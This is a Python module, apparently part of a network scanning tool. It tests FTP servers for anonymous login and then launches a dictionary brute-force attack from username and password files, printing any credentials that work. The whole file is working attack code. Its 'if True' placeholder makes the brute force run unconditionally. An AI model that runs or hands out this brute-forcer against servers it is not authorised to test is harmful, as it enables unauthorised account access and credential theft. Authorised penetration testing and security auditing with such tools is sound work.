import os
import ftplib
from src.configs import printt

def check_anonymous_login(ip):
    # Try to log in with anonymous credentials
    try:
        ftp = ftplib.FTP(ip)
        ftp.login('anonymous', '')
        print(f"[\033[32m+\033[0m] Anonymous login allowed on {ip}.")
        ftp.quit()
        return True
    except ftplib.error_perm as e:
        print(f"[\033[31m!\033[0m] Anonymous login not allowed on {ip}: {e}")
        return False

def brute_force_ftp(ip, username_file, password_file):
    # Brute-force login attempts using ftplib
    print(f"Starting brute force attack on FTP server at {ip}...")
    with open(username_file, 'r') as uf, open(password_file, 'r') as pf:
        usernames = [line.strip() for line in uf]
        passwords = [line.strip() for line in pf]

    for username in usernames:
        for password in passwords:
            try:
                print(f"Trying {username}:{password}...")
                ftp = ftplib.FTP(ip)
                ftp.login(username, password)
                print(f"[\033[32m+\033[0m] Login successful with {username}:{password}")
                ftp.quit()
                return True
            except ftplib.error_perm as e:
                # Login failed, print error message if needed
                pass
    print("[\033[31m!\033[0m] Brute-force attack finished, no valid credentials found.")
    return False

def ftp_info(ip):

    # Gather IP and scan for FTP vulnerabilities
    if True:
        # Check if anonymous login is allowed
        if check_anonymous_login(ip):
            print(f"Warning: Anonymous login is allowed. This is a security risk.")
        else:
            print("Anonymous login not allowed, attempting brute force...")
        
        # Path to username and password lists for brute forcing
        username_file = 'usernames.txt'
        password_file = 'passwords.txt'

        # Run brute-force attack if anonymous login fails
        brute_force_ftp(ip, username_file, password_file)
    else:
        print("[\033[31m!\033[0m] FTP service not detected or port 21 is closed.")


def ftp(target):
    ftp_info(target)
    printt('\nother more scanning will coming soon...')